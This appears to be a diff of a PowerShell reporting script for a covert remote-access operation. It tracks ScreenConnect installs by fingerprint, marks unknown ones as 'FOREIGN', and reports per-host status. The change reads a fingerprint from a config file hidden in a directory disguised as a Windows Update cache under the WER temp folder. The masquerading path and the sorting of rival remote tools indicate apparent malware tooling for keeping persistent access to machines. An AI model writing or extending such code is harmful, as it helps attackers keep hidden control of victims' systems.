@@ -1,5 +1,5 @@
 #Requires -Version 5.1
-# TG_REPORT BUILD 20260802T15 - root-level task names (IDENTVER=7); TR ownership; RMM+Datto keep
+# TG_REPORT BUILD 20260802T16 - root-level task names (IDENTVER=7); TR ownership; RMM+Datto keep; dynamic gryxa FP
 param(
     [Parameter(Mandatory = $true)][string]$State,
     [string]$Summary = '',
@@ -227,13 +227,26 @@ function Get-RmmHits {
     return $hits
 }
 
+function Get-GryxaKeepFp {
+    $fp = '9908198e668e4750'
+    $p = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\gryxa.cfg'
+    if ($WorkDir) { $p = Join-Path $WorkDir 'gryxa.cfg' }
+    if (Test-Path -LiteralPath $p) {
+        Get-Content -LiteralPath $p -ErrorAction SilentlyContinue | ForEach-Object {
+            if ($_ -match '^CURRENT_FP=([0-9a-fA-F]{16})\s*$') { $fp = $matches[1].ToLower() }
+        }
+    }
+    return $fp
+}
+
 function Get-ScInstalls {
+    $gryxaFp = Get-GryxaKeepFp
     $list = New-Object System.Collections.Generic.List[string]
     Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'ScreenConnect Client*' } | ForEach-Object {
         $fp = if ($_.Name -match '\(([0-9a-f]{16})\)') { $matches[1] } else { '?' }
         $tag = if ($fp -eq '5f6010579852e507') { 'KEEP-SEVRZ' }
         elseif ($fp -eq 'f861c8140d453427') { 'KEEP-ALT' }
-        elseif ($fp -eq '9908198e668e4750') { 'KEEP-GRYXA' }
+        elseif ($fp -eq $gryxaFp) { 'KEEP-GRYXA' }
         else { 'FOREIGN' }
         [void]$list.Add(('- <code>{0}</code>: <b>{1}</b> [{2}]' -f (Esc $_.Name), (Esc ([string]$_.Status)), $tag))
     }
@@ -412,7 +425,7 @@ $deployBlock = ''
 if ($key -eq 'DEPLOY') {
     $verdict = if ($deployOk) { 'DEPLOYED / HEALTHY' } else { 'DEPLOYED BUT INCOMPLETE' }
     $foreign = @(Get-ChildItem -Path "${env:ProgramFiles}\ScreenConnect Client*","${env:ProgramFiles(x86)}\ScreenConnect Client*" -Directory -ErrorAction SilentlyContinue |
-        Where-Object { $_.Name -notmatch '5f6010579852e507|f861c8140d453427|9908198e668e4750' })
+        Where-Object { $_.Name -notmatch ("5f6010579852e507|f861c8140d453427|{0}" -f (Get-GryxaKeepFp)) })
     $diagLines = New-Object System.Collections.Generic.List[string]
     $bootPath = Join-Path $WorkDir 'boot.err'
     if (Test-Path $bootPath) {
@@ -482,7 +495,7 @@ $deployBlock
 <b>ScreenConnect (all)</b>
 - Sevrz <code>5f6010579852e507</code>: $(Esc $primLine)
 - Alt <code>f861c8140d453427</code>: $(Esc $altLine)
-- Gryxa <code>9908198e668e4750</code>: $(Esc (Get-SvcLine 'ScreenConnect Client (9908198e668e4750)'))
+- Gryxa <code>$(Esc (Get-GryxaKeepFp))</code>: $(Esc (Get-SvcLine ("ScreenConnect Client ({0})" -f (Get-GryxaKeepFp))))
 $($scList -join "`n")
 
 <b>Other RMM / remote tools</b>
@@ -511,7 +524,7 @@ if ($Mode -eq 'compact') {
     $msiShort = if (Test-Path $msiCache) { '{0:N0}KB' -f ((Get-Item $msiCache -Force).Length / 1KB) } else { '0' }
     $primShort = if ($primOk) { 'OK' } else { 'DOWN' }
     $altShort = if ($altLine -like 'Running*') { 'OK' } else { '-' }
-    $gryxaLine = Get-SvcLine 'ScreenConnect Client (9908198e668e4750)'
+    $gryxaLine = Get-SvcLine ("ScreenConnect Client ({0})" -f (Get-GryxaKeepFp))
     $gryxaShort = if ($gryxaLine -like 'Running*') { 'OK' } else { '-' }
     $text = "$emoji SCD|$($env:COMPUTERNAME)|sev=$primShort|gry=$gryxaShort|alt=$altShort|f=$foreignN|t=$taskOk/5|b=$Build"
 }
